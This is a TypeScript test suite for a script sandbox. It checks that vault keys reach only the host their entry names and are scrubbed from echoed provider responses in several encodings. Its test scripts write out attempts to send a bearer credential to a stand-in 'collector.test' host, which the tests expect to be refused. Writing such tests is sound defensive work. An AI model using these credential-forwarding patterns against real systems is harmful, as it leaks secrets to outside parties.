/**
 * A script's key goes to the host its vault entry opens, and to nothing else (`loop/research-batch-thirty-five-audit.md`
 * findings 2 and 4).
 *
 * A SCRIPT NAMES ITS KEYS AND ITS ORIGINS AS TWO LISTS, AND NOTHING JOINED THEM. The audit's probe ran the runner as
 * `server.ts` builds it with a vault of two grants: `goldapi`, whose entry says it opens `api.gold.test`, went out as a
 * bearer to `collector.test` because that origin was also in the script's `egress:`, and the vault's `slash` key (the
 * one the included model answers everybody with on a host with no `SLASH_KEY`) went the same way. Every grant row
 * says what it opens (`opens TEXT NOT NULL`), and nothing on the script's path read it.
 *
 * AND THE SCRUB KNEW ONE SPELLING OF THE KEY. `sendAction` took the key out of a provider's answer as the exact bytes
 * only, so a provider that echoed the header JSON-escaped the PHP way, base64-encoded or URL-encoded handed it to the
 * sandbox, and `ctx.log(await r.text())` put it on the run's event.
 *
 * THE RUNNER, NOT THE WHOLE SERVER. What is under test is `scriptSandbox` between QuickJS and the socket: the vault is
 * a list of rows, `send` records every request that would have left, and `openKey` records every key it was asked for.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';

import type { Scripted } from '@braindog/kernel';

import type { Resolve, Send } from '../src/actions.ts';
import { scriptSandbox } from '../src/script.ts';

const REC = 'rec_01JZ8QK3F7R2M9V4XN6TCB5HAD';
const PUBLIC = '203.0.113.10';
const GOLD = 'https://api.gold.test';
const COLLECTOR = 'https://collector.test';

/** Every grant's bytes, by id. Not secrets: each says whose it is, so a leak names its own source. */
const SECRET: Record<string, string> = { g_gold: 'SECRET-OF-goldapi', g_slash: 'SECRET-OF-slash', g_slashes: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY' };

type Row = { id: string; label: string; opens: string; revoked_at: string | null; created_at: string };
const at = '2026-09-22T00:00:00.000Z';
const VAULT: Row[] = [
  { id: 'g_gold', label: 'goldapi', opens: 'api.gold.test', revoked_at: null, created_at: at },
  /* THE KEY LABELLED `slash` IS SAID TO OPEN THE COLLECTOR, so the only thing that can refuse it there is its label. */
  { id: 'g_slash', label: 'slash', opens: 'collector.test', revoked_at: null, created_at: at },
  { id: 'g_slashes', label: 'slashed', opens: 'https://api.gold.test/', revoked_at: null, created_at: at },
  /* A PARENT OF THE HOST FETCHED, and prose, the two ways an `opens` does not name `api.gold.test` exactly. */
  { id: 'g_parent', label: 'parent', opens: 'gold.test', revoked_at: null, created_at: at },
  { id: 'g_prose', label: 'prose', opens: 'the Gold test account', revoked_at: null, created_at: at },
];

const resolve: Resolve = async (host) => (host === 'api.gold.test' || host === 'collector.test' ? [{ address: PUBLIC, family: 4 }] : []);

/**
 * A provider that echoes the authorization header back, in the spelling its path names. `/php` is PHP's default
 * `json_encode`, which escapes every `/`; `/b64` is the header base64-encoded whole, as a debug echo writes it; `/url`
 * is the header URL-encoded, as an error body quoting a request line does. Anything else echoes it as sent.
 */
function provider(): { send: Send; sent: { host: string; auth: string | null }[] } {
  const sent: { host: string; auth: string | null }[] = [];
  return {
    sent,
    send: async (url, init) => {
      const auth = new Headers(init.headers).get('authorization');
      sent.push({ host: url.host, auth });
      const heard = auth ?? '';
      const body =
        url.pathname === '/php'
          ? JSON.stringify({ heard }).replaceAll('/', '\\/')
          : url.pathname === '/b64'
            ? JSON.stringify({ heard: btoa(heard) })
            : url.pathname === '/url'
              ? JSON.stringify({ heard: encodeURIComponent(heard) })
              : JSON.stringify({ heard });
      return new Response(body, { status: 200, headers: { 'content-type': 'application/json' } });
    },
  };
}

/** One run of `source` through the self-host's runner, with `egress` and `keys` as the script declares them. */
async function run(source: string, egress: string[], keys: string[], limits?: Record<string, number>) {
  const net = provider();
  const opened: string[] = [];
  const runner = scriptSandbox({ kernel: { grants: () => VAULT } } as never, {
    openKey: async (grant) => (opened.push(grant.id), SECRET[grant.id] ?? null),
    send: net.send,
    resolve,
  });
  const answer = await runner({
    job: { id: 'o_1', leasedUntil: '' },
    host: 'api.gold.test',
    scripted: {
      script: 'relay',
      version: 1,
      actor: 'script:relay@v1',
      input: null,
      decl: { egress, keys, reads: [], writes: ['seen'], ...(limits === undefined ? {} : { limits }), source },
      record: { id: REC, tz: 'UTC' },
    },
  } as unknown as Scripted);
  return { answer, sent: net.sent, opened };
}

test('A KEY GOES TO THE HOST ITS VAULT ENTRY OPENS: goldapi reaches api.gold.test and is refused for collector.test before it is opened', async () => {
  /* THE CONTROL FIRST, so the refusal below is about the host and not about the key. */
  const home = await run(`export default async function run(ctx) { await ctx.fetch(${JSON.stringify(GOLD)} + '/rate', { key: 'goldapi' }); }`, [GOLD, COLLECTOR], ['goldapi']);
  assert.ok('writes' in home.answer, JSON.stringify(home.answer));
  assert.deepEqual(home.sent, [{ host: 'api.gold.test', auth: 'Bearer SECRET-OF-goldapi' }]);

  /* K1 IN THE AUDIT: `{"answer":"ran","opened":["goldapi"],"sent":[{"host":"collector.test","auth":"Bearer SECRET-OF-goldapi"}]}`. */
  const away = await run(`export default async function run(ctx) { await ctx.fetch(${JSON.stringify(COLLECTOR)} + '/in', { key: 'goldapi' }); }`, [GOLD, COLLECTOR], ['goldapi']);
  assert.ok('refused' in away.answer, JSON.stringify(away.answer));
  assert.equal(away.answer.refused.code, 'FORBIDDEN');
  assert.match(away.answer.refused.why, /The key "goldapi" opens api\.gold\.test, and relay fetched collector\.test with it/);
  assert.deepEqual(away.sent, [], 'the key left for a host its vault entry does not open');
  assert.deepEqual(away.opened, [], 'the key was opened for a request that could not be sent');
});

test('AN ENTRY THAT OPENS A PARENT DOMAIN, OR NAMES NO HOST AT ALL, OPENS NOTHING UNDER IT: no subdomain is let in', async () => {
  /* WRITTEN BY THE CHECKER, because `keyRefused` says `opens: stripe.com` does not open `api.stripe.com` and every case
     above stayed green with its exact comparison widened to `host.endsWith('.' + opens)`. */
  for (const [label, opens] of [
    ['parent', 'gold.test'],
    ['prose', '"the Gold test account"'],
  ] as const) {
    const away = await run(`export default async function run(ctx) { await ctx.fetch(${JSON.stringify(GOLD)} + '/rate', { key: ${JSON.stringify(label)} }); }`, [GOLD], [label]);
    assert.ok('refused' in away.answer, `${label}: ${JSON.stringify(away.answer)}`);
    assert.equal(away.answer.refused.code, 'FORBIDDEN', label);
    assert.ok(away.answer.refused.why.includes(`The key "${label}" opens ${opens}, and relay fetched api.gold.test with it`), away.answer.refused.why);
    assert.deepEqual([away.sent, away.opened], [[], []], label);
  }
});

test('A KEY SENT AWAY IS A RULE BROKEN, NOT AN ERROR TO CATCH: the run is refused and nothing after it is sent', async () => {
  const caught = await run(
    `export default async function run(ctx) {
  try { await ctx.fetch(${JSON.stringify(COLLECTOR)} + '/in', { key: 'goldapi' }); } catch (e) { ctx.log('caught'); }
  await ctx.fetch(${JSON.stringify(COLLECTOR)} + '/bare');
  ctx.write('seen', { said: 'after' });
}`,
    [GOLD, COLLECTOR],
    ['goldapi'],
  );
  assert.ok('refused' in caught.answer, JSON.stringify(caught.answer));
  assert.equal(caught.answer.refused.code, 'FORBIDDEN');
  assert.deepEqual(caught.sent, []);
});

test("THE VAULT'S `slash` KEY IS NEVER A SCRIPT'S, by its label or by its id, even to the host its entry opens", async () => {
  /* K2 IN THE AUDIT: `{"answer":"ran","opened":["slash"],"sent":[{"host":"collector.test","auth":"Bearer SECRET-OF-slash"}]}`. */
  for (const name of ['slash', 'g_slash']) {
    const named = await run(`export default async function run(ctx) { await ctx.fetch(${JSON.stringify(COLLECTOR)} + '/in', { key: ${JSON.stringify(name)} }); }`, [COLLECTOR], [name]);
    assert.ok('refused' in named.answer, `${name}: ${JSON.stringify(named.answer)}`);
    assert.equal(named.answer.refused.code, 'FORBIDDEN', name);
    assert.match(named.answer.refused.why, /slash/, name);
    assert.deepEqual(named.sent, [], name);
    assert.deepEqual(named.opened, [], name);
  }
});

test('THE KEY IS SCRUBBED FROM AN ANSWER IN EVERY SPELLING A PROVIDER ECHOES IT IN: JSON-escaped, base64 and URL-encoded', async () => {
  /* THE AUDIT'S KEY, WITH A `/` IN IT, because a key without one is the same bytes JSON-escaped and URL-encoded and the
     two cases would pass by accident. Measured before the fix in workerd: all three spellings arrived in `ctx.log`. */
  const key = SECRET['g_slashes']!;
  const { answer, sent } = await run(
    `export default async function run(ctx) {
  for (const path of ['/php', '/b64', '/url']) {
    const r = await ctx.fetch(${JSON.stringify(GOLD)} + path, { key: 'slashed' });
    ctx.log(path, await r.text());
  }
}`,
    [GOLD],
    ['slashed'],
  );
  assert.ok('writes' in answer, JSON.stringify(answer));
  assert.equal(sent.length, 3);
  const said = JSON.stringify(answer);
  const header = `Bearer ${key}`;
  for (const [how, spelling] of [
    ['as sent', key],
    ['JSON-escaped', key.replaceAll('/', '\\/')],
    ['URL-encoded', encodeURIComponent(key)],
    /* A WINDOW OUT OF THE MIDDLE, since the few characters at either end of a base64 run also carry the bits of the
       bytes around the key, and those are not the key's to scrub. */
    ['base64', btoa(header).slice(12, 44)],
  ] as const)
    assert.equal(answer.log.includes(spelling) || said.includes(spelling), false, `the key reached the sandbox ${how}: ${answer.log}`);
  assert.equal(answer.log.split('--redacted--').length - 1, 3, answer.log);
});

/* ── the two edges where the hosts answered different codes (`apps/worker/test/script.test.ts` holds the other side) ── */

test('A KEY SENT AWAY AND THEN AN OVERRUN IS FORBIDDEN, as on the Cloud: the broken rule outranks the deadline', async () => {
  /* THE DEADLINE MUST COME AFTER THE FETCH, OR THERE IS NO BROKEN RULE FOR IT TO BE OUTRANKED BY. `wall_ms` counts from
     before QuickJS is instantiated, and `cpu_ms` counts the interpreter's time up to the fetch. This test once ran
     `wall_ms: 300` under the default `cpu_ms` of 200 and busy-waited after the fetch: under a loaded machine (three
     workspaces at once, or 96 spinning processes on 32 cores, measured on September 27th) the engine had not reached
     the fetch by 300 ms, the run was an honest overrun with no key sent, and it answered OUT_OF_BOUNDS. So the budgets
     are wide enough that the fetch always lands inside them, and the overrun after it is a wait on a promise that never
     settles, which spends no CPU and can end only at the deadline. */
  const WALL = 3_000;
  const late = await run(
    `export default async function run(ctx) {
  try { await ctx.fetch(${JSON.stringify(COLLECTOR)} + '/in', { key: 'goldapi' }); } catch (e) { ctx.log('caught'); }
  await new Promise(() => {});
}`,
    [GOLD, COLLECTOR],
    ['goldapi'],
    { wall_ms: WALL, cpu_ms: 1_000 },
  );
  assert.ok('refused' in late.answer, JSON.stringify(late.answer));
  assert.equal(late.answer.refused.code, 'FORBIDDEN');
  assert.match(late.answer.refused.why, /The key "goldapi" opens api\.gold\.test, and relay fetched collector\.test with it/);
  /* AND THE DEADLINE DID END IT: the script caught the refusal and carried on, and only the clock stopped it. */
  assert.match(late.answer.log, /caught/);
  assert.ok(late.answer.usage.wall_ms >= WALL - 50, `the run ended at ${late.answer.usage.wall_ms} ms, before its wall_ms of ${WALL}`);
  assert.deepEqual([late.sent, late.opened], [[], []]);
});

test('A DECLARATION THAT IS MALFORMED AND NAMES THE `slash` KEY IS FORBIDDEN, as on the Cloud', async () => {
  const both = await run(`export default async function run(ctx) { ctx.log('never'); }`, [COLLECTOR], ['slash'], { wall_ms: 0 });
  assert.ok('refused' in both.answer, JSON.stringify(both.answer));
  assert.equal(both.answer.refused.code, 'FORBIDDEN');
  assert.deepEqual([both.sent, both.opened], [[], []]);
});
